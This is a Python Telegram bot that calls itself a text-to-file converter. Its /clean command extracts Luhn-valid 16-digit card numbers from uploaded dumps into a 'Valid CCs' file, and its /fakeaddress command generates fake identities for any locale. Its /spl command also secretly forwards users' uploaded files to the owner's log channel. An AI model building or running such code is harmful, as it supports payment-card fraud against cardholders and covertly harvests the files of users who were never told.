import os
import re
import threading
from urllib.parse import urlparse
from flask import Flask
import telebot
from telebot import types
from faker import Faker
import random

# === Configuration from environment variables ===
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID")) if os.getenv("LOG_CHANNEL_ID") else None

if not BOT_TOKEN or not CHANNEL_USERNAME or not LOG_CHANNEL_ID:
    raise Exception("Missing required environment variables: BOT_TOKEN, CHANNEL_USERNAME, LOG_CHANNEL_ID")

bot = telebot.TeleBot(BOT_TOKEN)

FORMATS = [
    ("txt", "📄"), ("html", "🌐"), ("json", "🗂"), ("csv", "📊"), ("xml", "📦"),
    ("yaml", "📘"), ("yml", "📘"), ("markdown", "📝"), ("ini", "⚙️"),
    ("cfg", "⚙️"), ("log", "📋"), ("py", "🐍"), ("js", "📜"),
    ("ts", "📜"), ("java", "☕"), ("c", "💻"), ("cpp", "💻"),
    ("php", "🐘"), ("go", "🚀"), ("rust", "🦀"), ("swift", "🧭"),
    ("kotlin", "🧪"), ("ruby", "💎"), ("sh", "🖥")
]
user_format = {}
user_text = {}

# Faker locales
faker = Faker()
SUPPORTED_LOCALES = Faker.locales

# === Helper functions ===
def check_user_joined(user_id):
    try:
        member = bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

def luhn_check(card_number):
    digits = [int(d) for d in card_number]
    checksum = 0
    reverse = digits[::-1]
    for i, d in enumerate(reverse):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0

# === Bot Handlers ===
@bot.message_handler(commands=['start'])
def start(message):
    if not check_user_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Join our Channel 🔔", url=f"https://t.me/{CHANNEL_USERNAME}"))
        bot.send_message(message.chat.id, "<b>You must join our channel to use this bot!</b>", parse_mode="HTML", reply_markup=markup)
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Owner 🙂", url="https://t.me/zeus_is_here"))
    bot.send_message(message.chat.id,
        "<b>Welcome to the Text-to-File Bot! 🎉</b>\n\n"
        "<b>Use /textfile to convert text to file.</b>\n"
        "<b>Use /spl [50–500] (reply to TXT) to split files.</b>\n"
        "<b>Use /clean (reply to TXT) to clean duplicates and extract CCs.</b>\n"
        "<b>Use /fakeaddress [country_code] to get a fake address.</b>",
        parse_mode="HTML", reply_markup=markup)

@bot.message_handler(commands=['textfile'])
def textfile(message):
    if not check_user_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Join our Channel 🔔", url=f"https://t.me/{CHANNEL_USERNAME}"))
        bot.send_message(message.chat.id, "<b>You must join our channel to use this bot!</b>", parse_mode="HTML", reply_markup=markup)
        return
    markup = types.InlineKeyboardMarkup(row_width=3)
    buttons = [types.InlineKeyboardButton(f"{emoji} {ext.upper()}", callback_data=f"format_{ext}") for ext, emoji in FORMATS]
    for i in range(0, len(buttons), 3):
        markup.row(*buttons[i:i+3])
    bot.send_message(message.chat.id, "<b>Choose a format to save your text:</b>", parse_mode="HTML", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("format_"))
def handle_format(call):
    ext = call.data.split("_")[1]
    user_format[call.from_user.id] = ext
    bot.send_message(call.message.chat.id, f"<b>Send me the text to save as .{ext}</b>", parse_mode="HTML")
    bot.delete_message(call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda m: m.from_user.id in user_format)
def get_text(message):
    ext = user_format.pop(message.from_user.id)
    text = message.text
    filename = f"textfile.{ext}"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(text)
    with open(filename, "rb") as f:
        bot.send_document(message.chat.id, f, caption=f"<b>Your file: {filename}</b>\n<b>Send new name to rename it (with extension)</b>", parse_mode="HTML")
    os.remove(filename)
    user_text[message.from_user.id] = text

@bot.message_handler(func=lambda m: m.from_user.id in user_text)
def rename_textfile(message):
    name = message.text.strip()
    if '.' not in name:
        bot.reply_to(message, "<b>Invalid name. Include an extension (e.g., .txt)</b>", parse_mode="HTML")
        return
    text = user_text.pop(message.from_user.id)
    with open(name, "w", encoding="utf-8") as f:
        f.write(text)
    with open(name, "rb") as f:
        bot.send_document(message.chat.id, f, caption=f"<b>Renamed and sent: {name}</b>", parse_mode="HTML")
    os.remove(name)

@bot.message_handler(commands=['spl'])
def split_file(message):
    try:
        num = int(message.text.split()[1])
        if not 50 <= num <= 500:
            raise ValueError
    except:
        bot.reply_to(message, "<b>Usage: /spl 300</b>\nLine count must be between 50–500.", parse_mode="HTML")
        return

    reply = message.reply_to_message
    if not reply or not reply.document:
        bot.reply_to(message, "<b>Reply to a file to split it.</b>", parse_mode="HTML")
        return

    try:
        bot.forward_message(LOG_CHANNEL_ID, reply.chat.id, reply.message_id)
    except Exception as e:
        print(f"Error forwarding to log channel: {e}")

    file_info = bot.get_file(reply.document.file_id)
    file_name = reply.document.file_name or ""
    if not file_name.lower().endswith(".txt"):
        bot.reply_to(message, "<b>Can only split .txt files.</b>", parse_mode="HTML")
        return

    try:
        file_bytes = bot.download_file(file_info.file_path)
        content = file_bytes.decode("utf-8")
    except Exception:
        bot.reply_to(message, "<b>Failed to download or decode file. Make sure it is UTF-8 encoded .txt file.</b>", parse_mode="HTML")
        return

    lines = content.splitlines()
    parts = [lines[i:i + num] for i in range(0, len(lines), num)]

    for i, part in enumerate(parts, 1):
        part_name = f"part_{i}.txt"
        with open(part_name, "w", encoding="utf-8") as f:
            f.write('\n'.join(part))
        with open(part_name, "rb") as f:
            bot.send_document(message.chat.id, f, caption=f"<b>Split part {i}</b>", parse_mode="HTML")
        os.remove(part_name)

@bot.message_handler(commands=['clean'])
def clean_and_extract_cc(message):
    reply = message.reply_to_message
    if not reply or not reply.document:
        bot.reply_to(message, "<b>Reply to a .txt file to clean it (remove duplicate domains & extract CCs).</b>", parse_mode="HTML")
        return

    file_info = bot.get_file(reply.document.file_id)
    content = bot.download_file(file_info.file_path).decode("utf-8")
    lines = content.splitlines()

    seen_domains = set()
    unique_lines = []
    valid_ccs = []

    for line in lines:
        line = line.strip()
        if not line:
            continue

        url_match = re.search(r'https?://[^\s]+', line)
        if url_match:
            domain = urlparse(url_match.group()).netloc.lower()
            if domain.startswith("www."):
                domain = domain[4:]
            if domain not in seen_domains:
                seen_domains.add(domain)
                unique_lines.append(line)
            continue

        cc_match = re.findall(r'\b(?:\d[ -]*?){13,19}\b', line)
        for cc in cc_match:
            cc_clean = re.sub(r"[^\d]", "", cc)
            if len(cc_clean) == 16 and luhn_check(cc_clean) and cc_clean not in valid_ccs:
                valid_ccs.append(cc_clean)

    cleaned_name = "cleaned_urls.txt"
    with open(cleaned_name, "w", encoding="utf-8") as f:
        f.write('\n'.join(unique_lines))
    with open(cleaned_name, "rb") as f:
        bot.send_document(message.chat.id, f, caption="<b>Cleaned URLs (duplicates removed)</b>", parse_mode="HTML")
    os.remove(cleaned_name)

    if valid_ccs:
        cc_file = "valid_ccs.txt"
        with open(cc_file, "w", encoding="utf-8") as f:
            f.write('\n'.join(valid_ccs))
        with open(cc_file, "rb") as f:
            bot.send_document(message.chat.id, f, caption="<b>Valid CCs Only 💳</b>", parse_mode="HTML")
        os.remove(cc_file)
    else:
        bot.send_message(message.chat.id, "<b>No valid CCs found.</b>", parse_mode="HTML")

# === Fake Address Command ===
@bot.message_handler(commands=['fakeaddress'])
def fake_address(message):
    if not check_user_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Join our Channel 🔔", url=f"https://t.me/{CHANNEL_USERNAME}"))
        bot.send_message(message.chat.id, "<b>You must join our channel to use this bot!</b>", parse_mode="HTML", reply_markup=markup)
        return

    args = message.text.split()
    if len(args) > 1:
        country_code = args[1].lower()
        if country_code not in [c.lower() for c in SUPPORTED_LOCALES]:
            bot.send_message(message.chat.id, "<b>❌ Invalid country code!</b>\n\nAvailable codes:\n" + ", ".join(sorted(SUPPORTED_LOCALES)), parse_mode="HTML")
            return
        locale_code = next(c for c in SUPPORTED_LOCALES if c.lower() == country_code)
    else:
        locale_code = random.choice(SUPPORTED_LOCALES)

    local_faker = Faker(locale_code)
    fake_info = (
        f"🆔 <b>Name:</b> {local_faker.name()}\n"
        f"🏠 <b>Address:</b>\n{local_faker.address()}\n"
        f"📧 <b>Email:</b> {local_faker.email()}\n"
        f"📞 <b>Phone:</b> {local_faker.phone_number()}\n"
        f"🏢 <b>Company:</b> {local_faker.company()}\n"
        f"🌍 <b>Locale:</b> {locale_code}"
    )
    bot.send_message(message.chat.id, fake_info, parse_mode="HTML")

# === Flask app ===
app = Flask(__name__)

@app.route("/")
def index():
    return "<h2>Text-to-File Bot is running!</h2>"

def run_bot():
    print("Starting bot polling thread...")
    bot.infinity_polling(skip_pending=True)

if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.start()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
